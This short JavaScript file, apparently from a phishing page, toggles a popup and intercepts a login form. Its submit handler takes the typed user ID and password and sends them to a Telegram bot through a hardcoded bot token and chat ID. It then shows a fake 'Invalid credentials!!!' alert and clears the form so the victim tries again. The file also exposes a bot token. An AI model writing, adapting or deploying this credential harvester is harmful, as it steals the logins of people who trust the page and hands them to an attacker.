
function clickMe() {
    document.getElementById("contain").classList.toggle("show");
}
function closeMe() {
    var x = document.getElementById("contain");
    x.style.transition = "all 1s ease-in-out";
    x.classList.remove("show");
}
                        
const loginForm = document.querySelector('form');
loginForm.addEventListener('submit',(e)=>{
e.preventDefault();
var text1;
 text1 = document.getElementById('userID').value;
var text2;
text2 = document.getElementById('password').value;
var token;
token = "5776576343:AAFIyJEG4u_upZvRuTCCno0d1xBbj9gewU8" ;
var my_text;
my_text = ` User ID: ${text1} %0A Password: ${text2}`
var chat_id;
chat_id = -861385528;
var url =  `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${my_text}/`
//   console.log("The user ID is:" ,userID);
//   console.log("The password is:" ,password);

let api = new XMLHttpRequest();
api.open("GET",url,true); 
api.send();
console.log("Message successfully sent");

alert("Invalid credentials!!!")
loginForm.reset();
}) 
